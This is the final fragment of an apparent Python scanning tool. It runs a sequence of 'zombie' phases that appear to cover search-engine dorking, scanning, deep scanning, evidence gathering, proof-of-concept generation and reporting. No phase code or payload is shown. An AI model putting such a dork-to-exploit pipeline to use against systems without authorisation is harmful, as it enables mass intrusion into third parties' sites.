        ctx["zombie_dork"] = zombie_dork_phase
        ctx["zombie_scan"] = zombie_scan_phase
        ctx["zombie_filter"] = zombie_filter_phase
        ctx["zombie_deep_scan"] = zombie_deep_scan_phase
        ctx["zombie_evidence"] = zombie_evidence_phase
        ctx["zombie_poc"] = zombie_poc_phase
        ctx["zombie_report"] = zombie_report_phase

        for step in config.workflow_steps:
            if step in ctx:
                print(f"\n{CYAN}{'='*60}{NC}")
                print(f"{CYAN}{BOLD}[{step.upper()}]{NC}")
                await zombie_progress_bar(step, 1.5)
                await ctx[step]()

if __name__ == "__main__":
    try: resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
    except: pass
    asyncio.run(main())
